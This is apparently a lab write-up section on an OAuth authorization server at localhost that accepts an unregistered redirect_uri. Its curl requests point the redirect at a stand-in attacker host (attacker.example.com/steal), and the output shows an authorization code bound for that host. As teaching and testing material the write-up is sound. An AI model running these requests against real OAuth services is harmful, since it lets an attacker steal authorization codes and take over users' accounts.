# Finding the Bug

## Enumerate the Authorization Endpoint

```bash
curl "http://localhost:8080/oauth/authorize?client_id=app&redirect_uri=http://localhost:8080/callback&state=test"
```

The server returns a 200 acknowledging the request. Now try a completely different `redirect_uri`:

```bash
curl "http://localhost:8080/oauth/authorize?client_id=app&redirect_uri=http://attacker.example.com/steal&state=test"
```

It also returns 200. The server does not reject the unregistered URI.

## Confirm the Vulnerability

POST an approval with the attacker URI:

```bash
curl -X POST -H 'Content-Type: application/json' \
  -d '{"client_id":"app","redirect_uri":"http://attacker.example.com/steal","state":"xyz","allow":true}' \
  http://localhost:8080/oauth/authorize
```

Output:

```json
{
  "code": "a1b2c3d4...",
  "redirect_to": "http://attacker.example.com/steal?code=a1b2c3d4...&state=xyz"
}
```

The authorization code is in the response. In a real flow the user's browser would follow that redirect, sending the code to the attacker's server.
